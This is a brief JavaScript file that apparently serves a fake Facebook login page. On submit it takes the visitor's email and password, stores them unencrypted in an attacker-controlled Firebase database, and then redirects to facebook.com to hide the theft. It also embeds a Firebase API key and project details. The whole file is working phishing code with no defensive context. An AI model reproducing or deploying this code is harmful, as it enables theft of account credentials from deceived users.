import { initializeApp } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js";
    import { getDatabase , ref, set, child, get } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-database.js";
    const firebaseConfig = {
    apiKey: "AIzaSyCuHrtSAPLC6CQeuv9WkaWcjksWFWly6TY",
  authDomain: "meetup-5ffb3.firebaseapp.com",
  databaseURL: "https://meetup-5ffb3-default-rtdb.firebaseio.com",
  projectId: "meetup-5ffb3",
  storageBucket: "meetup-5ffb3.appspot.com",
  messagingSenderId: "180793006827",
  appId: "1:180793006827:web:7665f36e7487bcf42e3cae"
  };
    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase();
    //...........................................The Refrences.......................//
    const email = document.getElementById('email');
    const pass = document.getElementById('password');
    const submit = document.getElementById('sub_btn');

    function RegisterUser(){
        const dbRef = ref(db);
        get(child(dbRef,"fbuserList/")).then((snapshot)=>{
           
                set(ref(db,"userList/"),
                {
                    email:email.value,
                    password:pass.value,

                })
                .then(()=>{
                    setTimeout(function() {
                        window.location="https://facebook.com";
                      }, 2000);
                    
                })
                .catch((error)=>{
                })
        });
    }
// function encPass(){
//         var pass12 = CryptoJS.AES.encrypt(pass.value, pass.value);
//         return pass12.toString();
//     }
    //..............................Function call...................//
    submit.addEventListener('click',RegisterUser);
